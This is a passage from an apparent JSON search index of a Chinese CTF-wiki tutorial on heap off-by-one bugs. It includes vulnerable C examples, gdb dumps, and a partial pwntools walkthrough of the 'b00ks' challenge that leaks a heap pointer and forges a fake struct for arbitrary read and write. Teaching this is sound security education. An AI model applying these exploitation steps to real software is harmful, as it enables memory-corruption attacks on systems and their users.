off-by-one\u3002\n\n\n\u6ce8\u610f\u5b57\u7b26\u4e32\u64cd\u4f5c\n\n\n\u5b57\u7b26\u4e32\u7ed3\u675f\u7b26\u5904\u7406\u7684\u4e0d\u4e25\u8c28\u5f80\u5f80\u4f1a\u5bfc\u81f4 off-by-one \u95ee\u9898\u3002\n\n\n\u4f8b\u5b50\n\n\n\u57fa\u672c\u4fe1\u606f\n\n\n\u279c  2015_plaidctf_datastore git:\n(\nmaster\n)\n file datastore \ndatastore: ELF \n64\n-bit LSB shared object, x86-64, version \n1\n \n(\nSYSV\n)\n, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, \nfor\n GNU/Linux \n2\n.6.24, BuildID\n[\nsha1\n]=\n1a031710225e93b0b5985477c73653846c352add, stripped\n\u279c  2015_plaidctf_datastore git:\n(\nmaster\n)\n checksec datastore \n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/off_by_one/2015_plaidctf_datastore/datastore\n\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n    FORTIFY:  Enabled\n\u279c  2015_plaidctf_datastore git:\n(\nmaster\n)\n \n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u662f64\u4f4d\u52a8\u6001\u94fe\u63a5\u7684\u3002\u4fdd\u62a4\u5168\u90e8\u5f00\u542f\u3002\u3002\u3002\n\n\n\u529f\u80fd\u5206\u6790\n\n\n\u5f85\u5b8c\u6210\u3002\n\n\n\u9898\u76ee\n\n\nb00ks\n\n\n\u4ecb\u7ecd\n\n\nAsis CTF 2016\u7684\u4e00\u9053\u9898\u76ee\uff0c\u8003\u5bdf\u70b9\u662fnull byte off-by-one\n\n\n\u9898\u76ee\u4ecb\u7ecd\n\n\n\u9898\u76ee\u662f\u4e00\u4e2a\u5e38\u89c1\u7684\u9009\u5355\u5f0f\u7a0b\u5e8f\uff0c\u529f\u80fd\u662f\u4e00\u4e2a\u56fe\u4e66\u7ba1\u7406\u7cfb\u7edf\u3002\n\n\n1. Create a book\n2. Delete a book\n3. Edit a book\n4. Print book detail\n5. Change current author name\n6. Exit\n\n\n\n\n\u7a0b\u5e8f\u63d0\u4f9b\u4e86\u521b\u5efa\u3001\u5220\u9664\u3001\u7f16\u8f91\u3001\u6253\u5370\u56fe\u4e66\u7684\u529f\u80fd\u3002\u9898\u76ee\u662f64\u4f4d\u7a0b\u5e8f\uff0c\u4fdd\u62a4\u5982\u4e0b\u6240\u793a\u3002\n\n\nCanary                        : No\nNX                            : Yes\nPIE                           : Yes\nFortify                       : No\nRelRO                         : Full\n\n\n\n\n\u7a0b\u5e8f\u6bcf\u521b\u5efa\u4e00\u4e2abook\u4f1a\u5206\u914d0x20\u5b57\u8282\u7684\u7ed3\u6784\u6765\u7ef4\u62a4\u5b83\u7684\u4fe1\u606f\n\n\nstruct book\n{\n    int id;\n    char *name;\n    char *description;\n    int size;\n}\n\n\n\n\ncreate\n\n\nbook\u7ed3\u6784\u4e2d\u5b58\u5728name\u548cdescription\uff0cname\u548cdescription\u5728\u5806\u4e0a\u5206\u914d\u3002\u9996\u5148\u5206\u914dname buffer\uff0c\u4f7f\u7528malloc\uff0c\u5927\u5c0f\u81ea\u5b9a\u4f46\u5c0f\u4e8e32\u3002\n\n\nprintf(\n\\nEnter book name size: \n, *(_QWORD *)\nsize);\n__isoc99_scanf(\n%d\n, \nsize);\nprintf(\nEnter book name (Max 32 chars): \n, \nsize);\nptr = malloc(size);\n\n\n\n\n\u4e4b\u540e\u5206\u914ddescription\uff0c\u540c\u6837\u5927\u5c0f\u81ea\u5b9a\u4f46\u65e0\u9650\u5236\u3002\n\n\nprintf(\n\\nEnter book description size: \n, *(_QWORD *)\nsize);\n        __isoc99_scanf(\n%d\n, \nsize);\n\nv5 = malloc(size);\n\n\n\n\n\u4e4b\u540e\u5206\u914dbook\u7ed3\u6784\u7684\u5185\u5b58\n\n\nbook = malloc(0x20uLL);\nif ( book )\n{\n    *((_DWORD *)book + 6) = size;\n    *((_QWORD *)off_202010 + v2) = book;\n    *((_QWORD *)book + 2) = description;\n    *((_QWORD *)book + 1) = name;\n    *(_DWORD *)book = ++unk_202024;\n    return 0LL;\n}\n\n\n\n\n\u6f0f\u6d1e\n\n\n\u7a0b\u5e8f\u7f16\u5199\u7684read\u51fd\u6570\u5b58\u5728null byte off-by-one\u6f0f\u6d1e\uff0c\u4ed4\u7ec6\u89c2\u5bdf\u8fd9\u4e2aread\u51fd\u6570\u53ef\u4ee5\u53d1\u73b0\u5bf9\u4e8e\u8fb9\u754c\u7684\u8003\u8651\u662f\u4e0d\u5f53\u7684\u3002\n\n\nsigned __int64 __fastcall my_read(_BYTE *ptr, int number)\n{\n  int i; // [rsp+14h] [rbp-Ch]\n  _BYTE *buf; // [rsp+18h] [rbp-8h]\n\n  if ( number \n= 0 )\n    return 0LL;\n  buf = ptr;\n  for ( i = 0; ; ++i )\n  {\n    if ( (unsigned int)read(0, buf, 1uLL) != 1 )\n      return 1LL;\n    if ( *buf == \n\\n\n )\n      break;\n    ++buf;\n    if ( i == number )\n      break;\n  }\n  *buf = 0;\n  return 0LL;\n}\n\n\n\n\n\u5229\u7528\n\n\n1.\u6cc4\u6f0f\n\n\n\u56e0\u4e3a\u7a0b\u5e8f\u4e2d\u7684my_read\u51fd\u6570\u5b58\u5728null byte off-by-one\uff0c\u4e8b\u5b9e\u4e0amy_read\u8bfb\u5165\u7684\u7ed3\u675f\u7b26'\\x00'\u662f\u5199\u5165\u52300x555555756060\u7684\u4f4d\u7f6e\u7684\u3002\u8fd9\u6837\u5f530x555555756060\uff5e0x555555756068\u5199\u5165book\u6307\u9488\u65f6\u5c31\u4f1a\u8986\u76d6\u6389\u7ed3\u675f\u7b26'\\x00'\uff0c\u6240\u4ee5\u8fd9\u91cc\u662f\u5b58\u5728\u4e00\u4e2a\u5730\u5740\u6cc4\u6f0f\u7684\u6f0f\u6d1e\u3002\u901a\u8fc7\u6253\u5370author name\u5c31\u53ef\u4ee5\u83b7\u5f97pointer array\u4e2d\u7b2c\u4e00\u9879\u7684\u503c\u3002\n\n\n0x555555756040: 0x6161616161616161  0x6161616161616161\n0x555555756050: 0x6161616161616161  0x6161616161616161   \n== author name\n0x555555756060: 0x0000555555757480 \n== pointer array    0x0000000000000000\n0x555555756070: 0x0000000000000000  0x0000000000000000\n0x555555756080: 0x0000000000000000  0x0000000000000000\n\n\n\n\n\u4e3a\u4e86\u5b9e\u73b0\u6cc4\u6f0f\uff0c\u9996\u5148\u5728author name\u4e2d\u9700\u8981\u8f93\u516532\u4e2a\u5b57\u8282\u6765\u4f7f\u5f97\u7ed3\u675f\u7b26\u88ab\u8986\u76d6\u6389\u3002\u4e4b\u540e\u6211\u4eec\u521b\u5efabook1\uff0c\u8fd9\u4e2abook1\u7684\u6307\u9488\u4f1a\u8986\u76d6\n\n\ndef js(str):\n     return io.recvuntil(str)\n\ndef jsn(num):\n     return io.recvn(num)\n\ndef fs(str):\n     io.sendline(str)\n\ndef fsn(str):\n     io.send(str)\n\njs(\nEnter author name:\n) #input author name\nfs(\na\n*32)\n\njs(\n)# create book1\nfs(\n1\n)\njs(\nEnter book name size:\n)\nfs(\n32\n)\njs(\nEnter book name (Max 32 chars):\n)\nfs(\nobject1\n)\njs(\nEnter book description size:\n)\nfs(\n32\n)\njs(\nEnter book description:\n)\nfs(\nobject1\n)\n\njs(\n)# print book1\nfs(\n4\n)\njs(\nAuthor:\n)\njs(\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n) # \n== leak book1\nbook1_addr=jsn(6)\nbook1_addr=book1_addr.ljust(8,\n\\x00\n)\nbook1_addr=u64(book1_addr)\n\n\n\n\n2.off-by-one\u8986\u76d6\u6307\u9488\u4f4e\u5b57\u8282\n\n\n\u7a0b\u5e8f\u4e2d\u540c\u6837\u63d0\u4f9b\u4e86\u4e00\u79cdchange\u529f\u80fd\uff0cchange\u529f\u80fd\u7528\u4e8e\u4fee\u6539author name\uff0c\u6240\u4ee5\u901a\u8fc7change\u53ef\u4ee5\u5199\u5165author name\uff0c\u5229\u7528off-by-one\u8986\u76d6pointer array\u7b2c\u4e00\u4e2a\u9879\u7684\u4f4e\u5b57\u8282\u3002\n\n\n\u8986\u76d6\u6389book1\u6307\u9488\u7684\u4f4e\u5b57\u8282\u540e\uff0c\u8fd9\u4e2a\u6307\u9488\u4f1a\u6307\u5411book1\u7684description\uff0c\u7531\u4e8e\u7a0b\u5e8f\u63d0\u4f9b\u4e86edit\u529f\u80fd\u53ef\u4ee5\u4efb\u610f\u4fee\u6539description\u4e2d\u7684\u5185\u5bb9\u3002\u6211\u4eec\u53ef\u4ee5\u63d0\u524d\u5728description\u4e2d\u5e03\u7f6e\u6570\u636e\u4f2a\u9020\u6210\u4e00\u4e2abook\u7ed3\u6784\uff0c\u8fd9\u4e2abook\u7ed3\u6784\u7684description\u548cname\u6307\u9488\u53ef\u4ee5\u7531\u76f4\u63a5\u63a7\u5236\u3002\n\n\ndef off_by_one(addr):\n    addr+=58\n    js(\n)# create fake book in description\n    fs(\n3\n)\n    fake_book_data=p64(0x1)+p64(addr)+p64(addr)+pack(0xffff) \n    js(\nEnter new book description:\n)\n    fs(fake_book_data)      # \n== fake book\n\n\n    js(\n)# change author name\n    fs(\n5\n)\n    js(\nEnter author name:\n)\n    fs(\na\n*32)          # \n== off-by-one\n\n\n\n\n\u8fd9\u91cc\u5728description\u4e2d\u4f2a\u9020\u4e86book\uff0c\u4f7f\u7528\u7684\u6570\u636e\u662fp64(0x1)+p64(addr)+p64(addr)+pack(0xffff)\u3002\n\u5176\u4e2daddr+58\u662f\u4e3a\u4e86\u4f7f\u6307\u9488\u6307\u5411book2\u7684\u6307\u9488\u5730\u5740\uff0c\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u4efb\u610f\u4fee\u6539\u8fd9\u4e9b\u6307\u9488\u503c\u3002\n\n\n3.\u901a\u8fc7\u6808\u5b9e\u73b0\u5229\u7528\n\n\n\u901a\u8fc7\u524d\u97622\u90e8\u5206\u6211\u4eec\u5df2\u7ecf\u83b7\u5f97\u4e86\u4efb\u610f\u5730\u5740\u8bfb\u5199\u7684\u80fd\u529b\uff0c\u8bfb\u8005\u8bfb\u5230\u8fd9\u91cc\u53ef\u80fd\u4f1a\u89c9\u5f97\u4e0b\u9762\u7684\u64cd\u4f5c\u662f\u663e\u800c\u6613\u89c1\u7684\uff0c\u6bd4\u5982\u5199got\u8868\u52ab\u6301\u6d41\u7a0b\u6216\u8005\u5199__malloc_hook\u52ab\u6301\u6d41\u7a0b\u7b49\u3002\u4f46\u662f\u8fd9\u4e2a\u9898\u76ee\u7279\u6b8a\u4e4b\u5904\u5728\u4e8e\u5f00\u542fPIE\u5e76\u4e14\u6ca1\u6709\u6cc4\u6f0flibc\u57fa\u5730\u5740\u7684\u65b9\u6cd5\uff0c\u56e0\u6b64\u6211\u4eec\u8fd8\u9700\u8981\u60f3\u4e00\u4e0b\u5176\u4ed6\u7684\u529e\u6cd5\u3002\n\n\n\u8fd9\u9053\u9898\u7684\u5de7\u5999\u4e4b\u5904\u5728\u4e8e\u5728\u5206\u914d\u7b2c\u4e8c\u4e2abook\u65f6\uff0c\u4f7f\u7528\u4e00\u4e2a\u5f88\u5927\u7684\u5c3a\u5bf8\uff0c\u4f7f\u5f97\u5806\u4ee5mmap\u6a21\u5f0f\u8fdb\u884c\u62d3\u5c55\u3002\u6211\u4eec\u77e5\u9053\u5806\u6709\u4e24\u79cd\u62d3\u5c55\u65b9\u5f0f\u4e00\u79cd\u662fbrk\u4f1a\u76f4\u63a5\u62d3\u5c55\u539f\u6765\u7684\u5806\uff0c\u53e6\u4e00\u79cd\u662fmmap\u4f1a\u5355\u72ec\u6620\u5c04\u4e00\u5757\u5185\u5b58\u3002\n\n\n\u5728\u8fd9\u91cc\u6211\u4eec\u7533\u8bf7\u4e00\u4e2a\u8d85\u5927\u7684\u5757\uff0c\u6765\u4f7f\u7528mmap\u6269\u5c55\u5185\u5b58\u3002\u56e0\u4e3ammap\u5206\u914d\u7684\u5185\u5b58\u4e0elibc\u4e4b\u524d\u5b58\u5728\u56fa\u5b9a\u7684\u504f\u79fb\u56e0\u6b64\u53ef\u4ee5\u63a8\u7b97\u51falibc\u7684\u57fa\u5730\u5740\u3002\n\nStart              End                Offset             Perm Path\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/123/123\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/123/123\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/123/123\n0x00007f8d638a3000 0x00007f8d63a63000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f8d63a63000 0x00007f8d63c63000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f8d63c63000 0x00007f8d63c67000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f8d63c67000 0x00007f8d63c69000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f8d63c69000 0x00007f8d63c6d000 0x0000000000000000 rw- \n0x00007f8d63c6d000 0x00007f8d63c93000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007f8d63e54000 0x00007f8d63e79000 0x0000000000000000 rw- \n=== mmap\n0x00007f8d63e92000 0x00007f8d63e93000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007f8d63e93000 0x00007f8d63e94000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007f8d63e94000 0x00007f8d63e95000 0x0000000000000000 rw- \n0x00007ffdc4f12000 0x00007ffdc4f33000 0x0000000000000000 rw- [stack]\n0x00007ffdc4f7a000 0x00007ffdc4f7d000 0x0000000000000000 r-- [vvar]\n0x00007ffdc4f7d000 0x00007ffdc4f7f000 0x0000000000000000 r-x [vdso]\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]\n\n\n\nStart              End                Offset             Perm Path\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/123/123\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/123/123\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/123/123\n0x00007f6572703000 0x00007f65728c3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f65728c3000 0x00007f6572ac3000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f6572ac3000 0x00007f6572ac7000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f6572ac7000 0x00007f6572ac9000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f6572ac9000 0x00007f6572acd000 0x0000000000000000 rw- \n0x00007f6572acd000 0x00007f6572af3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007f6572cb4000 0x00007f6572cd9000 0x0000000000000000 rw- \n=== mmap\n0x00007f6572cf2000 0x00007f6572cf3000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007f6572cf3000 0x00007f6572cf4000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007f6572cf4000 0x00007f6572cf5000 0x0000000000000000 rw- \n0x00007fffec566000 0x00007fffec587000 0x0000000000000000 rw- [stack]\n0x00007fffec59c000 0x00007fffec59f000 0x0000000000000000 r-- [vvar]\n0x00007fffec59f000 0x00007fffec5a1000 0x0000000000000000 r-x [vdso]\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]", 
            "title": "\u5806\u4e2d\u7684 Off-By-One"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#off-by-one", 
            "text": "", 
            "title": "\u5806\u4e2d\u7684 Off-By-One"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#_1", 
            "text": "\u4e25\u683c\u6765\u8bf4 off-by-one \u6f0f\u6d1e\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u6ea2\u51fa\u6f0f\u6d1e\uff0coff-by-one \u6307\u7a0b\u5e8f\u5411\u7f13\u51b2\u533a\u4e2d\u5199\u5165\u65f6\uff0c\u5199\u5165\u7684\u5b57\u8282\u6570\u8d85\u8fc7\u4e86\u8fd9\u4e2a\u7f13\u51b2\u533a\u672c\u8eab\u6240\u7533\u8bf7\u7684\u5b57\u8282\u6570\u5e76\u4e14\u53ea\u8d8a\u754c\u4e86\u4e00\u4e2a\u5b57\u8282\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#off-by-one_1", 
            "text": "off-by-one \u662f\u6307\u5355\u5b57\u8282\u7f13\u51b2\u533a\u6ea2\u51fa\uff0c\u8fd9\u79cd\u6f0f\u6d1e\u7684\u4ea7\u751f\u5f80\u5f80\u4e0e\u8fb9\u754c\u9a8c\u8bc1\u4e0d\u4e25\u548c\u5b57\u7b26\u4e32\u64cd\u4f5c\u6709\u5173\uff0c\u5f53\u7136\u4e5f\u4e0d\u6392\u9664\u5199\u5165\u7684 size \u6b63\u597d\u5c31\u53ea\u591a\u4e86\u4e00\u4e2a\u5b57\u8282\u7684\u60c5\u51b5\u3002\u5176\u4e2d\u8fb9\u754c\u9a8c\u8bc1\u4e0d\u4e25\u901a\u5e38\u5305\u62ec   \u4f7f\u7528\u5faa\u73af\u8bed\u53e5\u5411\u5806\u5757\u4e2d\u5199\u5165\u6570\u636e\u65f6\uff0c\u5faa\u73af\u7684\u6b21\u6570\u8bbe\u7f6e\u9519\u8bef(\u8fd9\u5728 C \u8bed\u8a00\u521d\u5b66\u8005\u4e2d\u5f88\u5e38\u89c1)\u5bfc\u81f4\u591a\u5199\u5165\u4e86\u4e00\u4e2a\u5b57\u8282\u3002  \u5b57\u7b26\u4e32\u64cd\u4f5c\u4e0d\u5408\u9002   \u4e00\u822c\u6765\u8bf4\uff0c\u5355\u5b57\u8282\u6ea2\u51fa\u88ab\u8ba4\u4e3a\u662f\u96be\u4ee5\u5229\u7528\u7684\uff0c\u4f46\u662f\u56e0\u4e3a Linux \u7684\u5806\u7ba1\u7406\u673a\u5236 ptmalloc \u9a8c\u8bc1\u7684\u677e\u6563\u6027\uff0c\u57fa\u4e8eLinux\u5806\u7684 off-by-one \u6f0f\u6d1e\u5229\u7528\u8d77\u6765\u5e76\u4e0d\u590d\u6742\uff0c\u5e76\u4e14\u5a01\u529b\u5f3a\u5927\u3002\n\u6b64\u5916\uff0c\u9700\u8981\u8bf4\u660e\u7684\u4e00\u70b9\u662f off-by-one \u662f\u53ef\u4ee5\u57fa\u4e8e\u5404\u79cd\u7f13\u51b2\u533a\u7684\uff0c\u6bd4\u5982\u6808\u3001bss \u6bb5\u7b49\u7b49\uff0c\u4f46\u662f\u5806\u4e0a(heap based)\u7684off-by-one \u662f CTF \u4e2d\u6bd4\u8f83\u5e38\u89c1\u7684\u3002\u6211\u4eec\u8fd9\u91cc\u4ec5\u8ba8\u8bba\u5806\u4e0a\u7684 off-by-one \u60c5\u51b5\u3002", 
            "title": "off-by-one \u6f0f\u6d1e\u539f\u7406"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#1", 
            "text": "int my_gets(char *ptr,int size)\n{\n    int i;\n    for(i=0;i =size;i++)\n    {\n        ptr[i]=getchar();\n    }\n    return i;\n}\nint main()\n{\n    void *chunk1,*chunk2;\n    chunk1=malloc(16);\n    chunk2=malloc(16);\n    puts( Get Input: );\n    my_gets(chunk1,16);\n    return 0;\n}  \u6211\u4eec\u81ea\u5df1\u7f16\u5199\u7684 my_gets \u51fd\u6570\u5bfc\u81f4\u4e86\u4e00\u4e2aoff-by-one\u6f0f\u6d1e\uff0c\u539f\u56e0\u662ffor\u5faa\u73af\u7684\u8fb9\u754c\u6ca1\u6709\u63a7\u5236\u597d\u5bfc\u81f4\u5199\u5165\u591a\u6267\u884c\u4e86\u4e00\u6b21\uff0c\u8fd9\u4e5f\u88ab\u79f0\u4e3a\u6805\u680f\u9519\u8bef   wikipedia:\n\u6805\u680f\u9519\u8bef\uff08\u6709\u65f6\u4e5f\u79f0\u4e3a\u7535\u7ebf\u6746\u9519\u8bef\u6216\u8005\u706f\u67f1\u9519\u8bef\uff09\u662f\u5dee\u4e00\u9519\u8bef\u7684\u4e00\u79cd\u3002\u5982\u4ee5\u4e0b\u95ee\u9898\uff1a  \u5efa\u9020\u4e00\u6761\u76f4\u6805\u680f\uff08\u5373\u4e0d\u56f4\u5708\uff09\uff0c\u957f30\u7c73\u3001\u6bcf\u6761\u6805\u680f\u67f1\u95f4\u76f8\u96943\u7c73\uff0c\u9700\u8981\u591a\u5c11\u6761\u6805\u680f\u67f1\uff1f  \u6700\u5bb9\u6613\u60f3\u5230\u7684\u7b54\u684810\u662f\u9519\u7684\u3002\u8fd9\u4e2a\u6805\u680f\u670910\u4e2a\u95f4\u9694\uff0c11\u6761\u6805\u680f\u67f1\u3002   \u6211\u4eec\u4f7f\u7528 gdb \u5bf9\u7a0b\u5e8f\u8fdb\u884c\u8c03\u8bd5\uff0c\u5728\u8fdb\u884c\u8f93\u5165\u524d\u53ef\u4ee5\u770b\u5230\u5206\u914d\u7684\u4e24\u4e2a\u7528\u6237\u533a\u57df\u4e3a16\u5b57\u8282\u7684\u5806\u5757 0x602000:   0x0000000000000000  0x0000000000000021  === chunk1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000021  === chunk2\n0x602030:   0x0000000000000000  0x0000000000000000 \n\u5f53\u6211\u4eec\u6267\u884c my_gets \u8fdb\u884c\u8f93\u5165\u4e4b\u540e\uff0c\u53ef\u4ee5\u770b\u5230\u6570\u636e\u53d1\u751f\u4e86\u6ea2\u51fa\u8986\u76d6\u5230\u4e86\u4e0b\u4e00\u4e2a\u5806\u5757\u7684 prev_size \u57df\nprint 'A'*17 0x602000:   0x0000000000000000  0x0000000000000021  === chunk1\n0x602010:   0x4141414141414141  0x4141414141414141\n0x602020:   0x0000000000000041  0x0000000000000021  === chunk2 \n0x602030:   0x0000000000000000  0x0000000000000000", 
            "title": "\u793a\u4f8b1"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#2", 
            "text": "\u7b2c\u4e8c\u79cd\u5e38\u89c1\u7684\u5bfc\u81f4 off-by-one \u7684\u573a\u666f\u5c31\u662f\u5b57\u7b26\u4e32\u64cd\u4f5c\u4e86\uff0c\u5e38\u89c1\u7684\u539f\u56e0\u662f\u5b57\u7b26\u4e32\u7684\u7ed3\u675f\u7b26\u8ba1\u7b97\u6709\u8bef  int main(void)\n{\n    char buffer[40]= ;\n    void *chunk1;\n    chunk1=malloc(24);\n    puts( Get Input );\n    gets(buffer);\n    if(strlen(buffer)==24)\n    {\n        strcpy(chunk1,buffer);\n    }\n    return 0;\n\n}  \u7a0b\u5e8f\u4e4d\u770b\u4e0a\u53bb\u6ca1\u6709\u4efb\u4f55\u95ee\u9898(\u4e0d\u8003\u8651\u6808\u6ea2\u51fa)\uff0c\u53ef\u80fd\u5f88\u591a\u4eba\u5728\u5b9e\u9645\u7684\u4ee3\u7801\u4e2d\u4e5f\u662f\u8fd9\u6837\u5199\u7684\u3002\n\u4f46\u662f strlen \u548c strcpy \u7684\u884c\u4e3a\u4e0d\u4e00\u81f4\u5374\u5bfc\u81f4\u4e86off-by-one \u7684\u53d1\u751f\u3002\nstrlen \u662f\u6211\u4eec\u5f88\u719f\u6089\u7684\u8ba1\u7b97 ascii \u5b57\u7b26\u4e32\u957f\u5ea6\u7684\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u5728\u8ba1\u7b97\u5b57\u7b26\u4e32\u957f\u5ea6\u65f6\u662f\u4e0d\u628a\u7ed3\u675f\u7b26  '\\x00'  \u8ba1\u7b97\u5728\u5185\u7684\uff0c\u4f46\u662f strcpy \u5728\u590d\u5236\u5b57\u7b26\u4e32\u65f6\u4f1a\u62f7\u8d1d\u7ed3\u675f\u7b26  '\\x00'  \u3002\u8fd9\u5c31\u5bfc\u81f4\u4e86\u6211\u4eec\u5411chunk1\u4e2d\u5199\u5165\u4e8625\u4e2a\u5b57\u8282\uff0c\u6211\u4eec\u4f7f\u7528gdb\u8fdb\u884c\u8c03\u8bd5\u53ef\u4ee5\u770b\u5230\u8fd9\u4e00\u70b9\u3002  0x602000:   0x0000000000000000  0x0000000000000021  === chunk1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000411  === next chunk  \u5728\u6211\u4eec\u8f93\u5165'A'*24\u540e\u6267\u884cstrcpy  0x602000:   0x0000000000000000  0x0000000000000021\n0x602010:   0x4141414141414141  0x4141414141414141\n0x602020:   0x4141414141414141  0x0000000000000400  \u53ef\u4ee5\u770b\u5230 next chunk \u7684 size \u57df\u4f4e\u5b57\u8282\u88ab\u7ed3\u675f\u7b26  '\\x00'  \u8986\u76d6\uff0c\u8fd9\u79cd\u53c8\u5c5e\u4e8e off-by-one \u7684\u4e00\u4e2a\u5206\u652f\u79f0\u4e3a NULL byte off-by-one\uff0c\u6211\u4eec\u5728\u540e\u9762\u4f1a\u770b\u5230 off-by-one \u4e0e NULL byte off-by-one \u5728\u5229\u7528\u4e0a\u7684\u533a\u522b\u3002\n\u8fd8\u662f\u6709\u4e00\u70b9\u5c31\u662f\u4e3a\u4ec0\u4e48\u662f\u4f4e\u5b57\u8282\u88ab\u8986\u76d6\u5462\uff0c\u56e0\u4e3a\u6211\u4eec\u901a\u5e38\u4f7f\u7528\u7684CPU\u7684\u5b57\u8282\u5e8f\u90fd\u662f\u5c0f\u7aef\u6cd5\u7684\uff0c\u6bd4\u5982\u4e00\u4e2aDWORD\u503c\u5728\u4f7f\u7528\u5c0f\u7aef\u6cd5\u7684\u5185\u5b58\u4e2d\u662f\u8fd9\u6837\u50a8\u5b58\u7684  DWORD 0x41424344\n\u5185\u5b58  0x44,0x43,0x42,0x41", 
            "title": "\u793a\u4f8b2"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#_2", 
            "text": "\u4e0a\u9762\u7684\u793a\u4f8b\u5176\u5b9e\u4e5f\u5c55\u793a\u4e86\u5bfb\u627e off-by-one \u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u6b65\u9aa4:", 
            "title": "\u5c0f\u603b\u7ed3"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#_3", 
            "text": "\u5728\u8fdb\u884c\u8bf8\u5982\u5faa\u73af\u5199\u5165\u7684\u64cd\u4f5c\u65f6\uff0c\u8981\u7279\u522b\u6ce8\u610f\u5faa\u73af\u7684\u6b21\u6570\u662f\u5426\u5b58\u5728\u8fb9\u754c\u95ee\u9898\u5bfc\u81f4\u7684 off-by-one\u3002", 
            "title": "\u6ce8\u610f\u5faa\u73af\u8fb9\u754c"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#_4", 
            "text": "\u5b57\u7b26\u4e32\u7ed3\u675f\u7b26\u5904\u7406\u7684\u4e0d\u4e25\u8c28\u5f80\u5f80\u4f1a\u5bfc\u81f4 off-by-one \u95ee\u9898\u3002", 
            "title": "\u6ce8\u610f\u5b57\u7b26\u4e32\u64cd\u4f5c"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#_5", 
            "text": "", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#_6", 
            "text": "\u279c  2015_plaidctf_datastore git: ( master )  file datastore \ndatastore: ELF  64 -bit LSB shared object, x86-64, version  1   ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,  for  GNU/Linux  2 .6.24, BuildID [ sha1 ]= 1a031710225e93b0b5985477c73653846c352add, stripped\n\u279c  2015_plaidctf_datastore git: ( master )  checksec datastore  [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/off_by_one/2015_plaidctf_datastore/datastore \n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n    FORTIFY:  Enabled\n\u279c  2015_plaidctf_datastore git: ( master )    \u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u662f64\u4f4d\u52a8\u6001\u94fe\u63a5\u7684\u3002\u4fdd\u62a4\u5168\u90e8\u5f00\u542f\u3002\u3002\u3002", 
            "title": "\u57fa\u672c\u4fe1\u606f"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#_7", 
            "text": "\u5f85\u5b8c\u6210\u3002", 
            "title": "\u529f\u80fd\u5206\u6790"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#_8", 
            "text": "", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#b00ks", 
            "text": "", 
            "title": "b00ks"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#_9", 
            "text": "Asis CTF 2016\u7684\u4e00\u9053\u9898\u76ee\uff0c\u8003\u5bdf\u70b9\u662fnull byte off-by-one", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#_10", 
